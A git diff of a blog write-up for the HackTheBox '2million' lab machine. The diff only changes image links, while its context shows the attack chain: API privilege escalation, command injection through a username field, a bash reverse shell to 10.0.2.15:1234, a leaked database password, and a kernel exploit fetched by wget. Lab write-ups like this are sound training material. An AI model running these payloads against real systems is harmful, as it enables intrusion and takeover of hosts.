@@ -2,7 +2,7 @@
 title: 2million
 published: 2024-08-05
 description: Writeup for an easy labeled linux based HTB machine named 2million.
-image: https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/2million_pwned.png
+image: ./2million/2million_pwned.png
 tags: [HackTheBox, Linux, Machines]
 category: Writeups
 draft: false
@@ -52,11 +52,11 @@ Nmap done: 1 IP address (1 host up) scanned in 61.03 seconds
 
 From the scan we have two ports 80, and 22 (for http and ssh) open.Now let's mess around through website (http://2million.htb).
 Here we have a typical old Hack the box website.
-![2million_website](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/2million_web.png)
+![2million_website](./2million/2million_web.png)
 
 I checked login page with some default creds, but it wasn't of any use😣. So let's first create an account here. When we click on join htb button, we are redirected to /invite page which is asking for invite code..
 
-![invite page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/invite_page.png)
+![invite page](./2million/invite_page.png)
 
 We don't have any code. Does that mean we are not invited??🥲
 
@@ -68,7 +68,7 @@ Of course not. We are Hackers. We are invited everywhere.😉
 So now let's inspect elements and check how the code is being generated and verified.
 
 In the Network tab, we can see inviteapi.min.js file being loaded and it contains some obfuscated js code.
-![invite api](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/invite_api.png)
+![invite api](./2million/invite_api.png)
 
 I gave the obfuscated js code to [de4js](https://lelinhtinh.github.io/de4js/). It deobfuscated and unpacked the js code. The deobfuscated code goes like this:
 ```javascript
@@ -155,13 +155,13 @@ and here we got the invite code in base 64 encoded form. Let's decode it.
     email    : test@mail.com
     
 And We are in. We have logged in as cyb3ritic and the website is pretty much like the old HTB website.
-![logged in](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/loggedin.png)
+![logged in](./2million/loggedin.png)
 
 It says that the site is performing database migrations, and some features are unavailable. In reality, that means most. The Dashboard, Rules, and Change Log links under “Main” work, and have nice throwback pages to the original HTB.
 
 Under “Labs”, the only link that really works is the “Access” page, which leads to /home/access:
 
-![access page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/access_page.png)
+![access page](./2million/access_page.png)
 
 Clicking on “Connection Pack” and “Regengerate” both return a .ovpn file. It’s a valid OpenVPN connection config, and We can try to connect with it, but it doesn’t work.
 
@@ -170,33 +170,33 @@ Clicking on “Connection Pack” and “Regengerate” both return a .ovpn file
 “Connection Pack” sends a GET request to /api/v1/user/vpn/generate, and “Regenerate” sends a GET to /api/v1/user/vpn/regenerate.
 
 I’ll send on of these requests to Burp Repeater and play with the API. /api returns a description:
-![api](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/api.png)
+![api](./2million/api.png)
 
 `/api/v1` returns the details of full API:
-![api/v1](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/api_v1.png)
+![api/v1](./2million/api_v1.png)
 
 ### Enumerating Admin api
 
 We have 3 API endpoints under /api/v1/admin. Let's try each of them.
 
 - when we try get request to /api/v1/admin/auth, we get a False message which signifies we are not admin.
-    ![admin_auth](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/admin_auth.png)
+    ![admin_auth](./2million/admin_auth.png)
 - when we try post request to /api/v1/admin/vpn/generate, we get 401 unauthorized response because we are not admin.
-    ![admin_vpn_generate](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/admin_vpn_generate.png)
+    ![admin_vpn_generate](./2million/admin_vpn_generate.png)
 - when we try put request to /api/v1/admin/settings/update, we got message as invalid content type.
-    ![admin_settings_update](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/admin_settings_update.png)
+    ![admin_settings_update](./2million/admin_settings_update.png)
 
     - let's copy the content type from response to request and resend the request. This time we got another message saying missing email parameter.
-    ![add content type](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/add_content_type.png)
+    ![add content type](./2million/add_content_type.png)
 
     - let's add email in json format and resend the request. This time we again got message saying missing is_admin parameter.
-    ![add email](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/add_email.png)
+    ![add email](./2million/add_email.png)
 
     - let's now add is_admin in json format and resend the request. And we finally set admin privilege to our account.
-    ![add privilege](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/add_priv.png)
+    ![add privilege](./2million/add_priv.png)
 
 - Now we are admin so let's try post request to /api/v1/admin/vpn/generate which was not authorized to us before. This time also we get message saying there is a missing parameter username and when we add username to our request, we get out vpn key generated.
-![generate vpn](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/generate_vpn.png)
+![generate vpn](./2million/generate_vpn.png)
 
 ### Command injection
 
@@ -205,15 +205,15 @@ It’s probably not PHP code that generates a VPN key, but rather some Bash tool
 It’s worth checking if there is any command injection.
 
 If the server is doing something like gen_vpn.sh [username], then I’ll try putting a `;` in the username to break that into a new command. I’ll also add a `#` at the end to comment out anything that might come after my input. It works:
-![command injection](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/CI.png)
+![command injection](./2million/CI.png)
 
 Let's included a bash -i reverse shell command in the login.php file using system command and fired up my netcat listener on port 1234.
 
 `bash -c "bash -i >& /dev/tcp/10.0.2.15/1234 0>&1" #`
-![shell command](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/shell_command.png)
+![shell command](./2million/shell_command.png)
 
 A reverse shell will land on your netcat after you send the request.
-![reverse shell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/rev_shell.png)
+![reverse shell](./2million/rev_shell.png)
 
 Let's first stabilize the shell using the following command:
 ```bash
@@ -257,12 +257,12 @@ DB_PASSWORD=SuperDuperPass123
 
 The password works fine for both su as admin and ssh.
 
-  - ![login via su](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/su.png)
+  - ![login via su](./2million/su.png)
 
-  - ![login via ssh](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/ssh.png)
+  - ![login via ssh](./2million/ssh.png)
 
 Either way we can grab the user falg with command `cat user.txt`
-![user flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/user_flag.png)
+![user flag](./2million/user_flag.png)
 
 ## Privilege Escalation
 
@@ -297,7 +297,7 @@ It tells about someting related to OverlayFS / FUSE CVE. Let's google it. We get
 There’s a [POC for this exploit](https://github.com/xkaneiki/CVE-2023-0386) on GitHub from researcher xkaneiki. The README.md is sparse, but gives enough instruction for use. 
 
 I was not able to directly clone this repo to my target machine so I clonned it to my local machine and then downloaded to my target machine using python server.
-![python server](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/python_server.png)
+![python server](./2million/python_server.png)
 
 Further i used wget command to get the folder.
 ```bash
@@ -307,17 +307,17 @@ wget -r http://10.10.14.70:8000/CVE-2023-0386
 Now after going inside the folder, I followed the command from the Readme file of POC.
 - `make all`
   - It throws some errors but three new binaries were generated which weren't there before.
-  ![make all command](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/make_all.png)
+  ![make all command](./2million/make_all.png)
 
 - `./fuse ./ovlcap/lower ./gc`
   - It hangs. So in other window I'll run the exploit.
-  ![running command](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/hung.png)
+  ![running command](./2million/hung.png)
 
 - `./exp'
   - and this command gave us the root.
-  ![exploit](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/exploit.png)
+  ![exploit](./2million/exploit.png)
 
 Now, simply going to /root directory we can cat out the root flag. 
-![root flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/root_flag.png)
+![root flag](./2million/root_flag.png)
 Hope this walkthrough was really interesting and you got to learn something new. Thankyou.
-![pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/2million/2million_pwned.png)
+![pwned](./2million/2million_pwned.png)
